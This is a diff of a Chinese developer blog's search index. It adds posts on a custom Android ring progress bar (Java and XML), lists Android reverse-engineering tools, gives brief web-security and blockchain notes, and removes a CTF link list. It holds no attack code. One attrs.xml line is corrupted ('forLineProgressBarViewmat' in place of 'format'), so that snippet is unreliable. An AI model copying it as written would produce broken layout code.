 <h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_38367802/article/details/77566102" target="_blank" rel="noopener">自定义View之线性百分比进度条</a><br><a href="https://blog.csdn.net/qq_31179919/article/details/52596965" target="_blank" rel="noopener">自定义View实现进度条</a><br><a href="https://juejin.im/entry/585a6b80ac502e006711fa8d" target="_blank" rel="noopener">Android 实现一个蛮酷的加载进度条</a><br><a href="https://blog.csdn.net/xuewater/article/details/45247885" target="_blank" rel="noopener">Android绘图总结（Bitmap，Canvas，Paint，圆角）</a><br><a href="https://www.sohu.com/a/203382364_659256" target="_blank" rel="noopener">一个功能强大的自定义SeekBar</a><br><a href="https://blog.csdn.net/harvic880925/article/details/50995268" target="_blank" rel="noopener">Android自定义控件三部曲文章索引</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android自定义view圆形进度条</title>
+    <url>/post/2381054113.html</url>
+    <content><![CDATA[<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/03.jpg" alt="效果图"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>attrs.xml  </p>
+<pre><code>&lt;declare-styleable name=&quot;RingProgressBarView&quot;&gt;
+    &lt;attr name=&quot;circle_radius&quot; format=&quot;dimension&quot;/&gt;
+    &lt;attr name=&quot;stroke_width&quot; format=&quot;dimension&quot;/&gt;
+    &lt;attr name=&quot;circle_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;ring_background_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;ring_cor&quot; forLineProgressBarViewmat=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;font_color&quot; format=&quot;color&quot;/&gt;
+    &lt;attr name=&quot;font_size&quot; format=&quot;dimension&quot;/&gt;
+&lt;/declare-styleable&gt;
+</code></pre><p>RingProgressBarView.java  </p>
+<pre><code>public class RingProgressBarView extends View {
+
+    // 画实心圆的画笔
+    private Paint mCirclePaint;
+    // 画圆环的画笔
+    private Paint mRingPaint;
+    // 画圆环的画笔背景色
+    private Paint mRingPaintBg;
+    // 画字体的画笔
+    private Paint mTextPaint;
+    // 圆形颜色
+    private int mCircleColor;
+    // 圆环颜色
+    private int mRingColor;
+    // 圆环背景颜色
+    private int mRingBgColor;
+    // 字体颜色
+    private int mTextColor;
+    // 字体大小
+    private float mTextSize;
+    // 半径
+    private float mRadius;
+    // 圆环半径
+    private float mRingRadius;
+    // 圆环宽度
+    private float mStrokeWidth;
+    // 圆心x坐标
+    private int mXCenter;
+    // 圆心y坐标
+    private int mYCenter;
+    // 字的长度
+    private float mTxtWidth;
+    // 字的高度
+    private float mTxtHeight;
+    // 总进度
+    private int mTotalProgress = 100;
+    // 当前进度
+    private float mProgress;
+
+    private String mProgressTxt;
+
+    public RingProgressBarView(Context context, @Nullable AttributeSet attrs) {
+        super(context, attrs);
+        initAttrs(context, attrs);
+        initVariable();
+    }
+
+    private void initAttrs(Context context,AttributeSet attrs) {
+        TypedArray typeArray = context.getTheme().obtainStyledAttributes(attrs,
+                R.styleable.RingProgressBarView, 0, 0);
+        mRadius = typeArray.getDimension(R.styleable.RingProgressBarView_circle_radius, dp2px(30));
+        mStrokeWidth = typeArray.getDimension(R.styleable.RingProgressBarView_stroke_width,dp2px(6));
+        mCircleColor = typeArray.getColor(R.styleable.RingProgressBarView_circle_color, Color.parseColor(&quot;#ffffff&quot;));
+        mRingColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_cor, Color.parseColor(&quot;#FF6059&quot;));
+        mRingBgColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_background_color,Color.parseColor(&quot;#E3E2E2&quot;));
+        mTextColor = typeArray.getColor(R.styleable.RingProgressBarView_font_color,Color.parseColor(&quot;#2E3D45&quot;));
+        mTextSize = typeArray.getDimension(R.styleable.RingProgressBarView_font_size,mRadius / 3);
+        mRingRadius = mRadius + mStrokeWidth / 2;
+    }
+
+    private void initVariable() {
+        //内圆
+        mCirclePaint = getPaint(Paint.Style.FILL,mCircleColor);
+
+
+        //外圆弧背景
+        mRingPaintBg = getPaint(Paint.Style.STROKE,mRingBgColor,mStrokeWidth);
+
+        //外圆弧
+        mRingPaint = getPaint(Paint.Style.STROKE,mRingColor,mStrokeWidth);
+        mRingPaint.setStrokeCap(Paint.Cap.ROUND);//设置线冒样式，有圆 有方
+
+        //中间字
+        mTextPaint = getPaint(Paint.Style.FILL,mTextColor);
+        mTextPaint.setTextSize(mTextSize);
+
+        Paint.FontMetrics fm = mTextPaint.getFontMetrics();
+        mTxtHeight = (int) Math.ceil(fm.descent - fm.ascent);
+    }
+
+    private Paint getPaint(Paint.Style style,int color){
+        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志
+        paint.setStyle(style);
+        paint.setColor(color);
+        paint.setAntiAlias(true);
+        return paint;
+    }
+    private Paint getPaint(Paint.Style style,int color,float width){
+        Paint paint = getPaint(style,color);
+        paint.setStrokeWidth(width);
+        return paint;
+    }
+
+    @Override
+    protected void onDraw(Canvas canvas) {
+//        super.onDraw(canvas);
+        mXCenter = getWidth() / 2;
+        mYCenter = getHeight() / 2;
+
+        //内圆
+        canvas.drawCircle(mXCenter, mYCenter, mRadius, mCirclePaint);
+
+        //外圆弧背景
+        RectF oval1 = new RectF();
+        oval1.left = (mXCenter - mRingRadius);
+        oval1.top = (mYCenter - mRingRadius);
+        oval1.right = mRingRadius * 2 + (mXCenter - mRingRadius);
+        oval1.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
+        canvas.drawArc(oval1, 0, 360, false, mRingPaintBg); //圆弧所在的椭圆对象、圆弧的起始角度、圆弧的角度、是否显示半径连线
+
+        //外圆弧
+        if (mProgress &gt; 0 ) {
+            RectF oval = new RectF();
+            oval.left = (mXCenter - mRingRadius);
+            oval.top = (mYCenter - mRingRadius);
+            oval.right = mRingRadius * 2 + (mXCenter - mRingRadius);
+            oval.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);
+            canvas.drawArc(oval, -90, -(((float)mProgress / mTotalProgress) * 360), false, mRingPaint); //
+
+            //字体
+            String txt = mProgressTxt + &quot;%&quot;;
+            mTxtWidth = mTextPaint.measureText(txt, 0, txt.length());
+            canvas.drawText(txt, mXCenter - mTxtWidth / 2, mYCenter + mTxtHeight / 4, mTextPaint);
+        }
+    }
+
+    //设置进度
+    public void setProgress(float progress) {
+        final ValueAnimator anim = ValueAnimator.ofFloat(0,progress);
+        anim.setDuration(3000);
+        anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
+            @Override
+            public void onAnimationUpdate(ValueAnimator animator) {
+                mProgress  = (float)animator.getAnimatedValue();
+                DecimalFormat df2 = new DecimalFormat(&quot;###.00&quot;);
+                mProgressTxt= df2.format(mProgress);
+                invalidate();
+            }
+        });
+        anim.start();
+    }
+    protected int dp2px(int dpVal) {
+        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());
+    }
+}
+</code></pre><p>activity_ring_progress_bar.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+                                             xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+                                             android:layout_width=&quot;match_parent&quot;
+                                             android:layout_height=&quot;match_parent&quot;&gt;
+
+    &lt;com.demo.android_view.mview.RingProgressBarView
+            android:id=&quot;@+id/rpbv&quot;
+            android:layout_width=&quot;120dp&quot;
+            android:layout_height=&quot;120dp&quot;/&gt;
+&lt;/android.support.constraint.ConstraintLayout&gt;
+</code></pre><p>RingProgressBarActivity.java  </p>
+<pre><code>public class RingProgressBarActivity extends AppCompatActivity {
+
+    private RingProgressBarView rpbv;
+
+    @Override
+    protected void onCreate(@Nullable Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_ring_progress_bar);
+        rpbv = findViewById(R.id.rpbv);
+        rpbv.setProgress(100f);
+    }
+}
+</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><a href="https://github.com/tea9/android_view" target="_blank" rel="noopener">源代码</a>  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_32519693/article/details/76726525" target="_blank" rel="noopener">Android 自定义漂亮的圆形进度条</a><br><a href="https://blog.csdn.net/zhangqunshuai/article/details/80760277" target="_blank" rel="noopener">Android自定义View之画圆环(进阶篇:圆形进度条)</a><br><a href="https://blog.csdn.net/mengks1987/article/details/77771465" target="_blank" rel="noopener">Android 自定义View实例之进度圆环</a><br><a href="https://blog.csdn.net/ahuyangdong/article/details/79942824" target="_blank" rel="noopener">Android花样loading进度条（二）-简单环形进度条</a><br><a href="https://www.jianshu.com/p/fd5616685d3d" target="_blank" rel="noopener">Android自定义圆形进度条</a><br><a href="https://blog.csdn.net/anonymousprogrammer/article/details/65634886" target="_blank" rel="noopener">android自定义控件之圆形进度条（带动画）</a>  </p>
 ]]></content>
       <categories>
         <category>android</category>
@@ -6703,6 +6703,68 @@ pip install request
       </tags>
   </entry>
   <entry>
+    <title>Android逆向工具介绍</title>
+    <url>/post/1830912127.html</url>
+    <content><![CDATA[<h2 id="反汇编工具"><a href="#反汇编工具" class="headerlink" title="反汇编工具"></a>反汇编工具</h2><ul>
+<li><strong>Apktool/ShakaApktool</strong></li>
+</ul>
+<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">apktool Download</a>  </p>
+<p><a href="https://github.com/rover12421/ShakaApktool" target="_blank" rel="noopener">ShakaApktool Github</a> 作者已经不更新了  </p>
+<ul>
+<li><p><strong>smali/baksmali</strong></p>
+</li>
+<li><p><strong>dex2jar</strong></p>
+</li>
+<li><p><strong>enjarify</strong></p>
+</li>
+</ul>
+<h2 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h2><ul>
+<li><p><strong>android-classyshark</strong></p>
+</li>
+<li><p><strong>jadx</strong></p>
+</li>
+<li><p><strong>JD-GUI</strong></p>
+</li>
+<li><p><strong>BytecodeViewer</strong></p>
+</li>
+<li><p><strong>Android Killer</strong></p>
+</li>
+</ul>
+<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip" target="_blank" rel="noopener">Android Killer下载</a>  </p>
+<h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><ul>
+<li><p><strong>JEB</strong></p>
+</li>
+<li><p><strong>jdb</strong></p>
+</li>
+<li><p><strong>Android Studio/Intellij IDEA</strong></p>
+</li>
+<li><p><strong>gdb</strong></p>
+</li>
+<li><p><strong>IDA Pro</strong></p>
+</li>
+</ul>
+<h2 id="Hook框架"><a href="#Hook框架" class="headerlink" title="Hook框架"></a>Hook框架</h2><ul>
+<li><p><strong>Cydia Substrate</strong></p>
+</li>
+<li><p><strong>Xposed</strong></p>
+</li>
+<li><p><strong>adbi</strong></p>
+</li>
+<li><p><strong>Frida</strong></p>
+</li>
+</ul>
+<h2 id="沙盒环境"><a href="#沙盒环境" class="headerlink" title="沙盒环境"></a>沙盒环境</h2><ul>
+<li><strong>DroidBox</strong></li>
+</ul>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>陶然四季</title>
     <url>/post/882445833.html</url>
     <content><![CDATA[<!-- <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29771932&auto=1&height=66"></iframe> -->
@@ -6777,68 +6839,6 @@ pip install request
       </categories>
       <tags>
         <tag>biu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android逆向工具介绍</title>
-    <url>/post/1830912127.html</url>
-    <content><![CDATA[<h2 id="反汇编工具"><a href="#反汇编工具" class="headerlink" title="反汇编工具"></a>反汇编工具</h2><ul>
-<li><strong>Apktool/ShakaApktool</strong></li>
-</ul>
-<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">apktool Download</a>  </p>
-<p><a href="https://github.com/rover12421/ShakaApktool" target="_blank" rel="noopener">ShakaApktool Github</a> 作者已经不更新了  </p>
-<ul>
-<li><p><strong>smali/baksmali</strong></p>
-</li>
-<li><p><strong>dex2jar</strong></p>
-</li>
-<li><p><strong>enjarify</strong></p>
-</li>
-</ul>
-<h2 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h2><ul>
-<li><p><strong>android-classyshark</strong></p>
-</li>
-<li><p><strong>jadx</strong></p>
-</li>
-<li><p><strong>JD-GUI</strong></p>
-</li>
-<li><p><strong>BytecodeViewer</strong></p>
-</li>
-<li><p><strong>Android Killer</strong></p>
-</li>
-</ul>
-<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip" target="_blank" rel="noopener">Android Killer下载</a>  </p>
-<h2 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h2><ul>
-<li><p><strong>JEB</strong></p>
-</li>
-<li><p><strong>jdb</strong></p>
-</li>
-<li><p><strong>Android Studio/Intellij IDEA</strong></p>
-</li>
-<li><p><strong>gdb</strong></p>
-</li>
-<li><p><strong>IDA Pro</strong></p>
-</li>
-</ul>
-<h2 id="Hook框架"><a href="#Hook框架" class="headerlink" title="Hook框架"></a>Hook框架</h2><ul>
-<li><p><strong>Cydia Substrate</strong></p>
-</li>
-<li><p><strong>Xposed</strong></p>
-</li>
-<li><p><strong>adbi</strong></p>
-</li>
-<li><p><strong>Frida</strong></p>
-</li>
-</ul>
-<h2 id="沙盒环境"><a href="#沙盒环境" class="headerlink" title="沙盒环境"></a>沙盒环境</h2><ul>
-<li><strong>DroidBox</strong></li>
-</ul>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -7185,6 +7185,18 @@ pip install request
       </tags>
   </entry>
   <entry>
+    <title>SSL和HTTPS</title>
+    <url>/post/902500137.html</url>
+    <content><![CDATA[<h2 id="SSL和HTTPS"><a href="#SSL和HTTPS" class="headerlink" title="SSL和HTTPS"></a>SSL和HTTPS</h2><p>加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。<br>HTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一不同的事情就是在运行工具时额外增加一个命令行参数或配置选项。者对测试的影响确实不大。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>tips</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>URL中的大小写敏感</title>
     <url>/post/1353455041.html</url>
     <content><![CDATA[<h2 id="URL中的大小写敏感"><a href="#URL中的大小写敏感" class="headerlink" title="URL中的大小写敏感"></a>URL中的大小写敏感</h2><pre><code>http://fred:wilma@www.example.com/private.asp?doc=3&amp;part=4#footer
@@ -7198,18 +7210,6 @@ pip install request
 <li><p>获取资源情况 （private.asp） ASP是Windows动态服务器扩展名 Windows服务器都不是大小写敏感的，因此/PRIvate.aSP可能也有效  </p>
 </li>
 </ol>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>tips</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSL和HTTPS</title>
-    <url>/post/902500137.html</url>
-    <content><![CDATA[<h2 id="SSL和HTTPS"><a href="#SSL和HTTPS" class="headerlink" title="SSL和HTTPS"></a>SSL和HTTPS</h2><p>加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。<br>HTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一不同的事情就是在运行工具时额外增加一个命令行参数或配置选项。者对测试的影响确实不大。</p>
 ]]></content>
       <categories>
         <category>web安全</category>
@@ -7617,6 +7617,47 @@ urlencode
       </tags>
   </entry>
   <entry>
+    <title>区块链学习</title>
+    <url>/post/2435934763.html</url>
+    <content><![CDATA[<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p><a href="https://btc.com" target="_blank" rel="noopener">比特币区块</a>  </p>
+<p><a href="https://anders.com/blockchain/" target="_blank" rel="noopener">区块链概念</a>   </p>
+<p><a href="https://bitcoin.org/zh_CN/download" target="_blank" rel="noopener">钱包</a>  </p>
+<p><a href="https://www.8btc.com/article/25065" target="_blank" rel="noopener">比特币总量</a>  </p>
+<p><a href="https://www.bitcoincash.org" target="_blank" rel="noopener">BCT官网</a>  </p>
+<p><a href="https://www.feixiaohao.com" target="_blank" rel="noopener">数字货币价格查询</a>  </p>
+<p><a href="http://www.btc798.com/articles/14863.html" target="_blank" rel="noopener">BTC历史分叉</a>  </p>
+<p><a href="http://www.sohu.com/a/216330641_481485" target="_blank" rel="noopener">ETH和EOS差异</a>  </p>
+<p><a href="https://www.blockchain.com/zh-cn/wallet#/" target="_blank" rel="noopener">网页版钱包</a>  </p>
+<p><a href="https://www.cybtc.com/article-2997-1.html" target="_blank" rel="noopener">区块链专利排名</a>  </p>
+<p><strong>区块链项目</strong></p>
+<p><a href="https://bitrating.com/blockchain/85408.html" target="_blank" rel="noopener">支付宝爱心捐赠平台</a>  </p>
+<p><a href="https://www.cryptokitties.co" target="_blank" rel="noopener">区块链游戏-CryptoKitties迷恋猫</a>  </p>
+<p><a href="http://c-chain.baidu.com/eco/index#/" target="_blank" rel="noopener">版权保护-百度图腾</a>  </p>
+<p><a href="http://www.chinaz.com/news/2018/0412/872765.shtml" target="_blank" rel="noopener">百度图腾介绍</a>  </p>
+<hr>
+<h2 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h2><p><a href="https://etherscan.io" target="_blank" rel="noopener">eth</a>  </p>
+<p><a href="https://solidity.readthedocs.io" target="_blank" rel="noopener">solidity</a>  </p>
+<p><a href="https://remix.ethereum.org" target="_blank" rel="noopener">remix IDE</a>  </p>
+<p><a href="https://www.myetherwallet.com/helpers.html" target="_blank" rel="noopener">以太坊单位换算</a>  </p>
+<p><a href="http://me.tryblockchain.org" target="_blank" rel="noopener">solidity API博客</a>  </p>
+<p><a href="http://www.tryblockchain.org" target="_blank" rel="noopener">solidity翻译API</a>  </p>
+<p><a href="#">Hyperledger Fabric</a> </p>
+<hr>
+<h2 id="EOS"><a href="#EOS" class="headerlink" title="EOS"></a>EOS</h2><p><a href="https://github.com/EOSIO/eos" target="_blank" rel="noopener">eos</a>    </p>
+<p><a href="http://blog.eosdata.io/index.php/tag/eos/" target="_blank" rel="noopener">EOS区块链开发指南</a>  </p>
+<p><a href="https://www.jianshu.com/p/011c8f12857b" target="_blank" rel="noopener">EOS应用开发入门</a>  </p>
+<p><a href="https://www.jianshu.com/p/f65bf7691482" target="_blank" rel="noopener">EOS中文白皮书</a>  </p>
+<p><a href="https://blog.csdn.net/baidang201/article/details/76861624" target="_blank" rel="noopener">eos的石墨烯技术是什么</a>  </p>
+<p><a href="https://eos.io/" target="_blank" rel="noopener">eosio</a>  </p>
+]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+      <tags>
+        <tag>区块链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>solidity的代码</title>
     <url>/post/3799772689.html</url>
     <content><![CDATA[<p><a href="https://remix.ethereum.org" target="_blank" rel="noopener">在线solidityIDE</a><br><a href="https://solidity.readthedocs.io" target="_blank" rel="noopener">solidity</a>  </p>
@@ -7947,47 +7988,6 @@ contract CrowdFunding{
 
 }
 </code></pre>]]></content>
-      <categories>
-        <category>区块链</category>
-      </categories>
-      <tags>
-        <tag>区块链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>区块链学习</title>
-    <url>/post/2435934763.html</url>
-    <content><![CDATA[<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p><a href="https://btc.com" target="_blank" rel="noopener">比特币区块</a>  </p>
-<p><a href="https://anders.com/blockchain/" target="_blank" rel="noopener">区块链概念</a>   </p>
-<p><a href="https://bitcoin.org/zh_CN/download" target="_blank" rel="noopener">钱包</a>  </p>
-<p><a href="https://www.8btc.com/article/25065" target="_blank" rel="noopener">比特币总量</a>  </p>
-<p><a href="https://www.bitcoincash.org" target="_blank" rel="noopener">BCT官网</a>  </p>
-<p><a href="https://www.feixiaohao.com" target="_blank" rel="noopener">数字货币价格查询</a>  </p>
-<p><a href="http://www.btc798.com/articles/14863.html" target="_blank" rel="noopener">BTC历史分叉</a>  </p>
-<p><a href="http://www.sohu.com/a/216330641_481485" target="_blank" rel="noopener">ETH和EOS差异</a>  </p>
-<p><a href="https://www.blockchain.com/zh-cn/wallet#/" target="_blank" rel="noopener">网页版钱包</a>  </p>
-<p><a href="https://www.cybtc.com/article-2997-1.html" target="_blank" rel="noopener">区块链专利排名</a>  </p>
-<p><strong>区块链项目</strong></p>
-<p><a href="https://bitrating.com/blockchain/85408.html" target="_blank" rel="noopener">支付宝爱心捐赠平台</a>  </p>
-<p><a href="https://www.cryptokitties.co" target="_blank" rel="noopener">区块链游戏-CryptoKitties迷恋猫</a>  </p>
-<p><a href="http://c-chain.baidu.com/eco/index#/" target="_blank" rel="noopener">版权保护-百度图腾</a>  </p>
-<p><a href="http://www.chinaz.com/news/2018/0412/872765.shtml" target="_blank" rel="noopener">百度图腾介绍</a>  </p>
-<hr>
-<h2 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h2><p><a href="https://etherscan.io" target="_blank" rel="noopener">eth</a>  </p>
-<p><a href="https://solidity.readthedocs.io" target="_blank" rel="noopener">solidity</a>  </p>
-<p><a href="https://remix.ethereum.org" target="_blank" rel="noopener">remix IDE</a>  </p>
-<p><a href="https://www.myetherwallet.com/helpers.html" target="_blank" rel="noopener">以太坊单位换算</a>  </p>
-<p><a href="http://me.tryblockchain.org" target="_blank" rel="noopener">solidity API博客</a>  </p>
-<p><a href="http://www.tryblockchain.org" target="_blank" rel="noopener">solidity翻译API</a>  </p>
-<p><a href="#">Hyperledger Fabric</a> </p>
-<hr>
-<h2 id="EOS"><a href="#EOS" class="headerlink" title="EOS"></a>EOS</h2><p><a href="https://github.com/EOSIO/eos" target="_blank" rel="noopener">eos</a>    </p>
-<p><a href="http://blog.eosdata.io/index.php/tag/eos/" target="_blank" rel="noopener">EOS区块链开发指南</a>  </p>
-<p><a href="https://www.jianshu.com/p/011c8f12857b" target="_blank" rel="noopener">EOS应用开发入门</a>  </p>
-<p><a href="https://www.jianshu.com/p/f65bf7691482" target="_blank" rel="noopener">EOS中文白皮书</a>  </p>
-<p><a href="https://blog.csdn.net/baidang201/article/details/76861624" target="_blank" rel="noopener">eos的石墨烯技术是什么</a>  </p>
-<p><a href="https://eos.io/" target="_blank" rel="noopener">eosio</a>  </p>
-]]></content>
       <categories>
         <category>区块链</category>
       </categories>
@@ -8897,89 +8897,153 @@ $ adb shell pm list packages // 列出所有已安装的包
       </tags>
   </entry>
   <entry>
-    <title>一些ctf的链接</title>
-    <url>/post/912287952.html</url>
-    <content><![CDATA[<p>忘了什么时候整理了！！！  </p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">ctfwiki</a>  </p>
-<p>工具：  </p>
-<p><a href="https://tools.pediy.com/win/debuggers.htm" target="_blank" rel="noopener">看雪CTF工具</a>  </p>
+    <title>设计模式-策略模式（strategy）</title>
+    <url>/post/2113223531.html</url>
+    <content><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p>
+<p>策略模式  ：  </p>
+<p>将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现<br>并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  </p>
+<p>不变更代码架构<br>通过开发与重构<br>拥抱需求的变化<br>使用策略模式  </p>
+<p>虚拟应用：  鸭子应用<br>飞行的能力<br>更多鸭子类型<br>每六个月发布一款产品  </p>
+<p>原有功能  </p>
+<p>鸭子的鸣叫功能<br>鸭子的显示功能  </p>
+<p>需求：<br>加入飞行能力  </p>
+<p>原有项目：<br>鸭子基类<br>Duck.class</p>
+<pre><code>/*
+ * 超类，所有的鸭子都要继承此类
+ * 抽象了鸭子的行为：显示和鸣叫
+ */
+public abstract class Duck {
+
+    /*
+     * 鸭子发出叫声
+     * 通用行为，由超类实现
+     */
+    public void quack(){
+        System.out.println(&quot;嘎嘎嘎&quot;);
+    }
+
+    /*
+     * 显示鸭子的外观
+     * 鸭子的外观各不相同，声明为abstract， 由子类实现
+     */
+    public abstract void display();
+
+
+}
+</code></pre><p>需求:让鸭子飞起来？  </p>
+<p>方案一：继承<br>    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  </p>
+<pre><code>Duck.class
+
+public void fly(){
+    System.out.println(&quot;用翅膀飞行&quot;);
+}
+</code></pre><p>优点<br>  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力<br>缺点<br>  不具有灵活性，对未来变更支持差<br>  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  </p>
+<p>———————————–pass———————————-  </p>
+<p>方案二：抽象方法<br>  在父类中提供抽象方法，强迫子类实现自己的飞行行为  </p>
+<pre><code>public abstract void fly();
+</code></pre><p>优点<br>  足够灵活。  </p>
+<p>缺点<br>  累死<br>  每个子类都要实现一遍代码，即使是相同的行为也不例外。<br>  代码重复，没有复用代码。  </p>
+<p>————————-pass————————————-  </p>
+<p>######继承是重用代码的利器  </p>
+<p>######但继承并不总是最好的工具  </p>
 <hr>
-<p>brainfuck  </p>
-<p>fuckjs  </p>
-<p>Writeup<br><a href="http://bobao.360.cn/ctf/detail/173.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/173.html</a><br><a href="http://www.freebuf.com/articles/web/94444.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/94444.html</a>  </p>
-<p>zip<br><a href="http://bobao.360.cn/ctf/detail/203.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/203.html</a>  </p>
-<p>cap<br><a href="http://www.jianshu.com/p/d4da13258f35" target="_blank" rel="noopener">http://www.jianshu.com/p/d4da13258f35</a>  </p>
-<p>cap<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a><br><a href="http://blog.csdn.net/sinat_34200786/article/details/76099974" target="_blank" rel="noopener">http://blog.csdn.net/sinat_34200786/article/details/76099974</a>  </p>
-<p><a href="https://www.secpulse.com/archives/38544.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/38544.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p>
-<p>音速猴子<br><a href="http://47.93.205.124:8001/" target="_blank" rel="noopener">http://47.93.205.124:8001/</a>  </p>
-<hr>
-<p>工具<br><a href="https://www.ctftools.com/" target="_blank" rel="noopener">https://www.ctftools.com/</a><br><a href="http://www.bugku.com/" target="_blank" rel="noopener">http://www.bugku.com/</a>  </p>
-<p>博客<br><a href="https://blog.ctftools.com/" target="_blank" rel="noopener">https://blog.ctftools.com/</a><br><a href="http://www.cnblogs.com/xuanhun/" target="_blank" rel="noopener">http://www.cnblogs.com/xuanhun/</a><br>阮一峰的网络日志<br><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/</a>  </p>
-<p>编码<br><a href="http://www.cnblogs.com/daban/p/5680451.html" target="_blank" rel="noopener">http://www.cnblogs.com/daban/p/5680451.html</a>  </p>
-<p>有个练习平台<br><a href="http://blog.csdn.net/helloc0de/article/details/68956222" target="_blank" rel="noopener">http://blog.csdn.net/helloc0de/article/details/68956222</a>  </p>
-<p>密码学<br><a href="http://blog.csdn.net/aldnoah_zero/article/details/52494982" target="_blank" rel="noopener">http://blog.csdn.net/aldnoah_zero/article/details/52494982</a><br><a href="http://blog.csdn.net/youzen_ing/article/details/73075180" target="_blank" rel="noopener">http://blog.csdn.net/youzen_ing/article/details/73075180</a><br><a href="http://www.am0s.com/ctf/179.html" target="_blank" rel="noopener">http://www.am0s.com/ctf/179.html</a><br><a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/136.html</a>  </p>
-<hr>
-<p><a href="https://trailofbits.github.io/ctf/" target="_blank" rel="noopener">https://trailofbits.github.io/ctf/</a>    –介绍  </p>
-<p><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a> –ctf竞赛时间  </p>
-<p><a href="https://time.xctf.org.cn/ctfs/" target="_blank" rel="noopener">https://time.xctf.org.cn/ctfs/</a>  –X-ctf  </p>
-<p><a href="http://ctf.sobug.com/Steganography.php" target="_blank" rel="noopener">http://ctf.sobug.com/Steganography.php</a> –SSCTF    –四叶草  </p>
